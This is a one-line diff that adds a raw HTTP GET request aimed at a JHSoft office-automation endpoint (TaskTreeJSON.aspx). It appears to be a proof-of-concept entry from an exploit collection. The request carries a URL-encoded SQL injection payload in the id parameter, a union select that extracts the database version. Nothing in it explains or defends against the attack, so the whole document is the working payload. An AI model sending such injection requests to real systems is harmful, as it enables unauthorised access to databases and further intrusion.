@@ -1,0 +1,1 @@
+GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+@@VERSION%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+  HTTP/1.1
